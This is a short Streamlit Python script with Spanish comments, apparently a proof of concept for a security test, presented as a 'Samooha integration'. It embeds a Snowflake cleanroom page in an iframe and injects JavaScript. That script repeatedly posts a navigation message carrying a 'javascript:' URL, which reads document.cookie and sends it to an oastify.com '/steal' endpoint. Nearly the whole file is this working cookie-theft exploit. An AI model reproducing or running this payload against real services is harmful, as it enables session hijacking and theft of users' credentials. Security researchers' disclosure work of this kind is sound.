import streamlit as st
import streamlit.components.v1 as components

st.title("Integración Samooha con postMessage")

st.iframe(
    "https://cleanroom.c1.us-east-1.aws.app.snowflake.com",
    height=600,
    alt="Streamlit documentation",
)
# Usamos components.html que SÍ permite la ejecución de JavaScript
components.html("""
<script>
(function() {
    function getTargetIframe() {
        const iframes = window.parent.document.querySelectorAll('iframe');
        // Filtra por src que contenga el dominio de Samooha
        for (const f of iframes) {
            if (f.src && f.src.includes('snowflake.com')) return f;
        }
        return null;
    }

    function sendPayload(f) {
        try {
            f.contentWindow.postMessage({
                eventKey: "__SAMOOHA__NAVIGATE_TO_URL",
                data: { auth_url: "javascript:fetch('https://kwk8biun0tbifxh84s3axlo2rtxklb90.oastify.com/steal?c='+encodeURIComponent(document.cookie))" }
            }, "*");
            console.log("[+] postMessage enviado");
        } catch (e) {
            console.error("[-] Error postMessage:", e);
        }
    }

    function tryAttach() {
        const f = getTargetIframe();
        if (!f) {
            console.log("[.] iframe aún no existe, reintentando...");
            return false;
        }
        if (f.dataset.payloadSent === "1") return true; // ya enviado

        // Si ya cargó, enviamos directo; si no, esperamos
        if (f.contentWindow) {
            // No podemos leer contentDocument (CORS), pero podemos
            // asumir readyState con un pequeño delay + reintentos
            sendPayload(f);
            f.dataset.payloadSent = "1";
            return true;
        }
        f.addEventListener('load', () => sendPayload(f), { once: true });
        return true;
    }

    // Reintenta hasta 20 veces cada 250ms (5s)
    let tries = 0;
    const iv = setInterval(() => {
        tries++;
        if (tryAttach() || tries > 20) clearInterval(iv);
    }, 250);

    // Envía también con un delay extra para asegurar que el listener de Samooha esté listo
    setTimeout(() => {
        const f = getTargetIframe();
        if (f) sendPayload(f);
    }, 3000);
})();
</script>
""", height=600)
